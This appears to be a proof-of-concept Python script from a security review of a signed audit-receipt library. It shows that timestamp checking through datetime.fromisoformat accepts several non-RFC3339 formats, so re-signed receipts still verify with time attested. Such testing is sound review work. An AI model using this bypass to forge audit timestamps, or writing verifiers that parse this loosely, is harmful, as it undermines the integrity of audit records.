#!/usr/bin/env python3
"""poc_alpha_9 — "valid RFC3339 times" is enforced by datetime.fromisoformat,
which is an ISO-8601 parser, NOT an RFC3339 parser. It accepts formats that
RFC3339 forbids: ISO week dates, basic (hyphen-less) format, comma decimal
fractions, and a space instead of the 'T' separator.

Every one of these verifies PASS with time_attested=True while a strict
RFC3339 consumer (Go time.RFC3339, JS Date.parse, the Article-12 profile's
own wording) rejects or misreads the same bytes => cross-implementation
verdict divergence on signed audit data. `created` also never has to
resemble when the action happened beyond the coarse window, so accepting
*representationally* ambiguous formats widens the signer's clock latitude.
"""
import sys, re
from datetime import datetime, timezone, timedelta
sys.path.insert(0, "/home/user/workspace/governance-as-code/tools")
from receipt_lib import (build_receipt, generate_keypair, verify_receipt,
                         canonical, sha256_hex, sign, keyid, PREDICATE_TYPE)

SVC = {"type": "service", "id": "svc-deploy-bot", "is_service_account": True,
       "auth_method": "mtls"}
POL = {"result": "ALLOW", "policy_hash": sha256_hex(b"policy-v1")}
EV = [{"id": "log", "sha256": sha256_hex(b"x"), "present": True}]

# Strict RFC3339 timestamp grammar (date-time production), for contrast.
RFC3339 = re.compile(r"^\d{4}-\d{2}-\d{2}[Tt]\d{2}:\d{2}:\d{2}(\.\d+)?([Zz]|[+-]\d{2}:\d{2})$")

def resign(stmt, sk):
    stmt["subject"]["digest"]["sha256"] = sha256_hex(canonical(stmt["predicate"]))
    payload = canonical({k: v for k, v in stmt.items() if k != "signatures"})
    stmt["signatures"] = [{"keyid": keyid(sk.public_key()),
                           "sig": sign(sk, PREDICATE_TYPE, payload)}]
    return stmt

sk, pk = generate_keypair()
now = datetime.now(timezone.utc) - timedelta(hours=1)
iso = now.isocalendar()
variants = {
    "ISO week date (forbidden by RFC3339)": f"{iso.year}-W{iso.week:02d}-{iso.weekday}T{now:%H:%M:%S}+00:00",
    "basic format, no hyphens/colons":      now.strftime("%Y%m%dT%H%M%S+00:00"),
    "comma decimal fraction":               now.strftime("%Y-%m-%dT%H:%M:%S") + ",5+00:00",
    "space instead of 'T'":                 now.strftime("%Y-%m-%d %H:%M:%S+00:00"),
}

broken = []
for label, ts in variants.items():
    assert not RFC3339.match(ts), f"test bug: {ts} is actually RFC3339"
    r = build_receipt(action_id="a-fmt", subject_name="prod:svc", actor=SVC,
                      policy_decision=POL,
                      execution={"side_effect_class": "READ_ONLY", "status": "EXECUTED"},
                      evidence_items=EV, prev_chain_hash="GENESIS", signing_key=sk)
    r["predicate"]["timestamps"]["created"] = ts
    resign(r, sk)
    v = verify_receipt(r, pk)
    ok = v.verdict == "PASS" and v.time_attested
    broken.append(ok)
    print(f"[*] {label:38s} created={ts!r:36s} -> {v.verdict} (time_attested={v.time_attested})")

print("EXPLOIT-WORKS" if broken and all(broken) else "HELD")
